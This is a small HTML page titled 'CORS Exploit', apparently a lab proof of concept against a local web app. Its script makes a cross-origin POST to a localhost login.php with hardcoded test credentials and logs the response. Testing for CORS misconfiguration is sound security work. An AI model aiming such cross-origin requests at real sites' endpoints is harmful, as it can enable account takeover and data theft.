<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit</title>
</head>
<body>
    <h1>Exploiting CORS</h1>
    <!-- url: http://localhost:5173/ -->
     <!-- url: http://localhost/webApp/project/login.php -->
    <script>
        fetch('http://localhost/webApp/project/login.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'email=jay@mail.com&password=jay@123'
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            console.log(response);
            return response.json();
        })
    </script>
</body>
</html>
